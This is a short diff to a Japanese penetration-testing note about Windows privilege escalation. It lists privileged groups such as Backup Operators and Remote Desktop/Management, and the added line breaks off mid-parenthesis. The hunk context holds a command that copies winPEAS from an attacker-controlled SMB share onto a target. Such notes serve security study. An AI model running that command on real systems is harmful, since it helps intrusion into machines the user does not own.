@@ -72,7 +72,7 @@ cp \\<AttackerIP>\share\winPEASx64.exe .
 > - `Backup`：閲覧権限がないファイルでも復元できる権限をもつ可能性
 > - `Backup Operators`：組込みグループで、どのファイルでも復元できる特権をもつ
 > - `Helpdesk`：一般ユーザーに比べ何か特権を持っている可能性がある
-> - `Remote Desktop/Management`グループ
+> - `Remote Desktop/Management`グループ：rdp/winrmで接続可能（
 
 ## ユーザー情報・ホスト名の列挙コマンド
 
